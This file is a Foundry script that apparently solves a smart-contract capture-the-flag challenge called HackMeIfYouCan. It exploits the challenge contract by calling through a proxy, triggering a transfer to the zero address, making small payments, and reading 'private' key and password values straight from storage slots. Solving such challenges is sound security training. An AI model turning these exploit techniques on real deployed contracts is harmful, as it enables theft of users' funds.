// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;
pragma experimental ABIEncoderV2;

import "../src/HackMeIfYouCan.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/Proxy.sol";
import "../src/Player.sol";
import "../src/Building.sol";

contract HackMeIfYouCanScript is Script {
    HackMeIfYouCan public hackMeIfYouCan;
    Proxy public proxy;
    address YasDev = 0x94e2057d263758630426BBcf1F801BEE5Bb52de4;

    bytes32 param1 = bytes32("oui");
    bytes32[15] param2;
    // address yassine = makeAddr("yassine");

    function run() external {
        for (uint i = 0; i < 15; i++) {
            param2[i] = bytes32(uint(i));
        }

        console.log("Solving HackMeIfYouCan...");
        uint256 id;
        assembly {
            id := chainid()
        }
        if (id == 11155111) {
            hackMeIfYouCan = HackMeIfYouCan(
                0x9D29D33d4329640e96cC259E141838EB3EB2f1d9
            );
        } else {
            console.log("Deploying contract...");

            vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
            vm.deal(YasDev, 1 ether);
            bytes32[15] memory data;
            for (uint256 i = 0; i < 15; i++) {
                bytes32 value = bytes32(uint256(i));
                data[i] = value;
            }
            hackMeIfYouCan = new HackMeIfYouCan(bytes32(uint256(0)), data);
            vm.stopBroadcast();
        }
        // proxy
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Deploying proxy contract oui... \n");
        proxy = new Proxy(address(hackMeIfYouCan));

        // for (uint i = 0; i < 10; i++) {
        //     hackMeIfYouCan.flip(false);
        //     vm.roll(block.number + 1);
        // }
        // console.log(hackMeIfYouCan.getMarks(YasDev));

        proxy.addPoint();
        console.log(hackMeIfYouCan.getMarks(YasDev));

        hackMeIfYouCan.transfer(address(0), 1);
        console.log(hackMeIfYouCan.getMarks(YasDev));
        //  contribute

        hackMeIfYouCan.contribute{value: 1 wei}();
        address(hackMeIfYouCan).call{value: 1 wei}("");
        console.log(hackMeIfYouCan.getMarks(YasDev));

        console.log("sendKey");
        bytes32 data = vm.load(address(hackMeIfYouCan), bytes32(uint256(16)));
        hackMeIfYouCan.sendKey(bytes16(data));
        console.log(hackMeIfYouCan.getMarks(YasDev));

        console.log("sendPassword");
        data = vm.load(address(hackMeIfYouCan), bytes32(uint256(3)));
        hackMeIfYouCan.sendPassword(data);
        console.log(hackMeIfYouCan.getMarks(YasDev));
        console.log(address(this));
        // console.log("floor");
        // building = new Building(hackMeIfYouCan);
        // building.hack();

        vm.stopBroadcast();
    }

    receive() external payable {}
}
